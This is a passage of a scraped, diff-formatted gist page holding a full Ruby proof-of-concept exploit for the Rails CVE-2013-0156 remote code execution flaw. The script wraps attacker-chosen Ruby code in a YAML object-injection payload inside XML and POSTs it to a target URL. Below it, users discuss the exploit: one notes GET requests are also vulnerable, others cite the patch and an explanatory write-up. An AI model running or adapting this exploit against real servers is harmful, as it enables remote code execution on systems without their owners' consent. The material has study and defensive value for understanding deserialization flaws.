+          <span id="file-rails_rce-rb-L121" rel="file-rails_rce-rb-L121">121</span>
+          <span id="file-rails_rce-rb-L122" rel="file-rails_rce-rb-L122">122</span>
+          <span id="file-rails_rce-rb-L123" rel="file-rails_rce-rb-L123">123</span>
+          <span id="file-rails_rce-rb-L124" rel="file-rails_rce-rb-L124">124</span>
+          <span id="file-rails_rce-rb-L125" rel="file-rails_rce-rb-L125">125</span>
+          <span id="file-rails_rce-rb-L126" rel="file-rails_rce-rb-L126">126</span>
+          <span id="file-rails_rce-rb-L127" rel="file-rails_rce-rb-L127">127</span>
+          <span id="file-rails_rce-rb-L128" rel="file-rails_rce-rb-L128">128</span>
+          <span id="file-rails_rce-rb-L129" rel="file-rails_rce-rb-L129">129</span>
+          <span id="file-rails_rce-rb-L130" rel="file-rails_rce-rb-L130">130</span>
+          <span id="file-rails_rce-rb-L131" rel="file-rails_rce-rb-L131">131</span>
+          <span id="file-rails_rce-rb-L132" rel="file-rails_rce-rb-L132">132</span>
+          <span id="file-rails_rce-rb-L133" rel="file-rails_rce-rb-L133">133</span>
+          <span id="file-rails_rce-rb-L134" rel="file-rails_rce-rb-L134">134</span>
+          <span id="file-rails_rce-rb-L135" rel="file-rails_rce-rb-L135">135</span>
+          <span id="file-rails_rce-rb-L136" rel="file-rails_rce-rb-L136">136</span>
+          <span id="file-rails_rce-rb-L137" rel="file-rails_rce-rb-L137">137</span>
+          <span id="file-rails_rce-rb-L138" rel="file-rails_rce-rb-L138">138</span>
+          <span id="file-rails_rce-rb-L139" rel="file-rails_rce-rb-L139">139</span>
+          <span id="file-rails_rce-rb-L140" rel="file-rails_rce-rb-L140">140</span>
+          <span id="file-rails_rce-rb-L141" rel="file-rails_rce-rb-L141">141</span>
+          <span id="file-rails_rce-rb-L142" rel="file-rails_rce-rb-L142">142</span>
+        </td>
+        <td class="line_data" width="100%">
+          <pre><div class="line" id="file-rails_rce-rb-LC1"><span class="c1">#!/usr/bin/env ruby</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC2"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC3"><span class="c1"># Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC4"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC5"><span class="c1"># ## Advisory</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC6"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC7"><span class="c1">#   https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC8"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC9"><span class="c1"># ## Caveats</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC10"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC11"><span class="c1"># * Does not support Ruby 1.8.7.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC12"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC13"><span class="c1"># ## Synopsis</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC14"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC15"><span class="c1">#   $ rails_rce.rb URL RUBY</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC16"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC17"><span class="c1"># ## Dependencies</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC18"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC19"><span class="c1">#   $ gem install ronin-support</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC20"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC21"><span class="c1"># ## Example</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC22"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC23"><span class="c1">#   $ rails_rce.rb http://localhost:3000/secrets/search &quot;puts &#39;lol&#39;&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC24"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC25"><span class="c1"># ### config/routes.rb</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC26"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC27"><span class="c1">#   resources :secrets do</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC28"><span class="c1">#     collection do</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC29"><span class="c1">#       post :search</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC30"><span class="c1">#     end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC31"><span class="c1">#   end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC32"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC33"><span class="c1"># ### app/controllers/secrets_controller.rb</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC34"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC35"><span class="c1">#   def search</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC36"><span class="c1">#     @secret = secret.find_by_secret(params[:secret])</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC37"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC38"><span class="c1">#     render :json =&gt; @secret</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC39"><span class="c1">#   end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC40"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC41"><span class="c1"># ## License</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC42"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC43"><span class="c1"># Copyright (c) 2013 Postmodern</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC44"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC45"><span class="c1"># This exploit is free software: you can redistribute it and/or modify</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC46"><span class="c1"># it under the terms of the GNU General Public License as published by</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC47"><span class="c1"># the Free Software Foundation, either version 3 of the License, or</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC48"><span class="c1"># (at your option) any later version.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC49"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC50"><span class="c1"># This exploit is distributed in the hope that it will be useful,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC51"><span class="c1"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC52"><span class="c1"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC53"><span class="c1"># GNU General Public License for more details.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC54"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC55"><span class="c1"># You should have received a copy of the GNU General Public License</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC56"><span class="c1"># along with this exploit.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC57"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC58"><span class="c1"># ## Shoutz</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC59"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC60"><span class="c1"># drraid, cd, px, sanitybit, sysfail, trent, dbcooper, goldy, coderman, letch,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC61"><span class="c1"># starik, toby, jlt, HockeyInJune, cloud, zek, natron, amesc, postmodern,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC62"><span class="c1"># mephux, nullthreat, evoltech, flatline, r0bglesson, @ericmonti, @bascule,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC63"><span class="c1"># @charliesome, @homakov, @envygeek, @chendo, @bitsweat (for creating the vuln),</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC64"><span class="c1"># @tenderlove (for fixing it), Fun Town Auto, garbage pail kids, hipsters,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC65"><span class="c1"># the old Jolly Inn, Irvin Santiago, that heavy metal dude who always bummed</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC66"><span class="c1"># cigarettes off us, SophSec crew and affiliates.</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC67"><span class="c1">#</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC68">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC69"><span class="nb">require</span> <span class="s1">&#39;ronin/network/http&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC70"><span class="nb">require</span> <span class="s1">&#39;ronin/formatting/html&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC71"><span class="nb">require</span> <span class="s1">&#39;ronin/ui/output&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC72"><span class="nb">require</span> <span class="s1">&#39;yaml&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC73">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC74"><span class="kp">include</span> <span class="ss">Ronin</span><span class="p">:</span><span class="ss">:Network</span><span class="o">::</span><span class="no">HTTP</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC75"><span class="kp">include</span> <span class="ss">Ronin</span><span class="p">:</span><span class="ss">:UI</span><span class="o">::</span><span class="ss">Output</span><span class="p">:</span><span class="ss">:Helpers</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC76">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC77"><span class="k">def</span> <span class="nf">escape_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">target</span><span class="o">=</span><span class="ss">:rails3</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC78">  <span class="k">case</span> <span class="n">target</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC79">  <span class="k">when</span> <span class="ss">:rails3</span> <span class="k">then</span> <span class="s2">&quot;foo</span><span class="se">\n</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="se">\n</span><span class="s2">__END__</span><span class="se">\n</span><span class="s2">&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC80">  <span class="k">when</span> <span class="ss">:rails2</span> <span class="k">then</span> <span class="s2">&quot;foo</span><span class="se">\n</span><span class="s2">end</span><span class="se">\n</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="se">\n</span><span class="s2">__END__</span><span class="se">\n</span><span class="s2">&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC81">  <span class="k">else</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC82">    <span class="k">raise</span><span class="p">(</span><span class="no">ArgumentError</span><span class="p">,</span><span class="s2">&quot;unsupported target: </span><span class="si">#{</span><span class="n">target</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC83">  <span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC84"><span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC85">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC86"><span class="k">def</span> <span class="nf">wrap_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC87">  <span class="s2">&quot;(</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2">; @executed = true) unless @executed&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC88"><span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC89">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC90"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">target</span><span class="o">=</span><span class="ss">:rails3</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC91">  <span class="n">escaped_payload</span> <span class="o">=</span> <span class="n">escape_payload</span><span class="p">(</span><span class="n">wrap_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">target</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC92">  <span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">escaped_payload</span><span class="o">.</span><span class="n">to_yaml</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39;--- &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">chomp</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC93">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC94">  <span class="n">yaml</span> <span class="o">=</span> <span class="sx">%{</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC95"><span class="sx">--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC96"><span class="sx">? </span><span class="si">#{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="sx"></span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC97"><span class="sx">: !ruby/struct</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC98"><span class="sx">  defaults:</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC99"><span class="sx">    :action: create</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC100"><span class="sx">    :controller: foos</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC101"><span class="sx">  required_parts: []</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC102"><span class="sx">  requirements:</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC103"><span class="sx">    :action: create</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC104"><span class="sx">    :controller: foos</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC105"><span class="sx">  segment_keys:</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC106"><span class="sx">    - :format</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC107"><span class="sx">  }</span><span class="o">.</span><span class="n">strip</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC108">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC109">  <span class="n">xml</span> <span class="o">=</span> <span class="sx">%{</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC110"><span class="sx">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC111"><span class="sx">&lt;exploit type=&quot;yaml&quot;&gt;</span><span class="si">#{</span><span class="n">yaml</span><span class="o">.</span><span class="n">html_escape</span><span class="si">}</span><span class="sx">&lt;/exploit&gt;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC112"><span class="sx">  }</span><span class="o">.</span><span class="n">strip</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC113">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC114">  <span class="k">return</span> <span class="n">http_post</span><span class="p">(</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC115">    <span class="ss">:url</span>       <span class="o">=&gt;</span> <span class="n">url</span><span class="p">,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC116">    <span class="ss">:headers</span>   <span class="o">=&gt;</span> <span class="p">{</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC117">      <span class="ss">:content_type</span>           <span class="o">=&gt;</span> <span class="s1">&#39;text/xml&#39;</span><span class="p">,</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC118">      <span class="ss">:x_http_method_override</span> <span class="o">=&gt;</span> <span class="s1">&#39;get&#39;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC119">    <span class="p">},</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC120">    <span class="ss">:body</span>      <span class="o">=&gt;</span> <span class="n">xml</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC121">  <span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC122"><span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC123">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC124"><span class="k">if</span> <span class="vg">$0</span> <span class="o">==</span> <span class="bp">__FILE__</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC125">  <span class="k">unless</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">length</span> <span class="o">&gt;=</span> <span class="mi">2</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC126">    <span class="vg">$stderr</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;usage: </span><span class="si">#{</span><span class="vg">$0</span><span class="si">}</span><span class="s2"> URL RUBY [rails3|rails2]&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC127">    <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC128">  <span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC129">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC130">  <span class="n">url</span>     <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC131">  <span class="n">payload</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC132">  <span class="n">target</span>  <span class="o">=</span> <span class="no">ARGV</span><span class="o">.</span><span class="n">fetch</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="ss">:rails3</span><span class="p">)</span><span class="o">.</span><span class="n">to_sym</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC133">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC134">  <span class="n">print_info</span> <span class="s2">&quot;POSTing </span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2"> to </span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2"> ...&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC135">  <span class="n">response</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">target</span><span class="p">)</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC136">&nbsp;</div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC137">  <span class="k">case</span> <span class="n">response</span><span class="o">.</span><span class="n">code</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC138">  <span class="k">when</span> <span class="s1">&#39;200&#39;</span> <span class="k">then</span> <span class="n">print_info</span> <span class="s2">&quot;Success!&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC139">  <span class="k">when</span> <span class="s1">&#39;500&#39;</span> <span class="k">then</span> <span class="n">print_error</span> <span class="s2">&quot;Error!&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC140">  <span class="k">else</span>            <span class="n">print_error</span> <span class="s2">&quot;Received response code </span><span class="si">#{</span><span class="n">response</span><span class="o">.</span><span class="n">code</span><span class="si">}</span><span class="s2">&quot;</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC141">  <span class="k">end</span></div></pre>
+          <pre><div class="line" id="file-rails_rce-rb-LC142"><span class="k">end</span></div></pre>
+        </td>
+      </tr>
+    </table>
+  </div>
+
+          </div>
+        </div>
+    <div id="comments" class="new-comments">
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/6962eeda5d20190857026da4621b9f9f?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714454">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/courtenay" class="comment-header-author">courtenay</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714454">
+              <a href="/4499206/#comment-714454">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714454">
+              <a href="/4499206/#comment-714454" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T05:05:21Z" datetime="2013-01-10T05:05:21Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>GETs are also vulnerable. (try it)</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/c4ceadae4f61dac8ff3ababc3faa6c42?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714494">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/fcoury" class="comment-header-author">fcoury</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714494">
+              <a href="/4499206/#comment-714494">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714494">
+              <a href="/4499206/#comment-714494" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T05:32:12Z" datetime="2013-01-10T05:32:12Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Do you know the changes needed for Rails 2 apps?</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/de3a1b8c8f8962230c5f165e01bf10e7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714631">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/lcx" class="comment-header-author">lcx</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714631">
+              <a href="/4499206/#comment-714631">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714631">
+              <a href="/4499206/#comment-714631" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T07:46:47Z" datetime="2013-01-10T07:46:47Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Update to 2.3.15 or use workaround: <a href="https://groups.google.com/forum/m/?fromgroups#!topic/rubyonrails-security/61bkgvnSGTQ">https://groups.google.com/forum/m/?fromgroups#!topic/rubyonrails-security/61bkgvnSGTQ</a></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/535d73db0b47b6f745e9981e80dabdb4?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-714730">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/brynary" class="comment-header-author">brynary</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-714730">
+              <a href="/4499206/#comment-714730">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-714730">
+              <a href="/4499206/#comment-714730" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T08:23:50Z" datetime="2013-01-10T08:23:50Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>I wrote up a detailed explanation of the Rails vulnerability here: <a href="http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/">http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/</a></p>
+
+<p>It breaks down a proof of concept example step by step to illustrate how object injection leads to code injection.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/d47d347fda36eaa1670d68e15ef8dc1b?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-715006">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/bachue" class="comment-header-author">bachue</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-715006">
+              <a href="/4499206/#comment-715006">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-715006">
+              <a href="/4499206/#comment-715006" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T10:55:38Z" datetime="2013-01-10T10:55:38Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Can you explain to me what does "__END__" do in this gist? Thanks</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/22e6332a6e9dca26ac384c4e3ed0f31e?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-715122">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/200proof" class="comment-header-author">200proof</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-715122">
+              <a href="/4499206/#comment-715122">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-715122">
+              <a href="/4499206/#comment-715122" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-10T12:56:26Z" datetime="2013-01-10T12:56:26Z">2013-01-10</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/bachue" class="user-mention">@bachue</a>: Ruby has a facility for inlining data into your code. Anything after <code>__END__</code> is ignored by the parser and is instead put into a special global called <code>DATA</code>. In this case, the named route generator does some wizardry using <code>module_eval</code>, and the <code>__END__</code> is used to make sure that only our code is run and any other wizardry skipped.</p>
+
+<p>More info on <code>DATA</code> and <code>__END__</code>: <a href="http://shifteleven.com/articles/2009/02/09/useless-ruby-tricks-data-and-__end__">http://shifteleven.com/articles/2009/02/09/useless-ruby-tricks-data-and-__end__</a></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
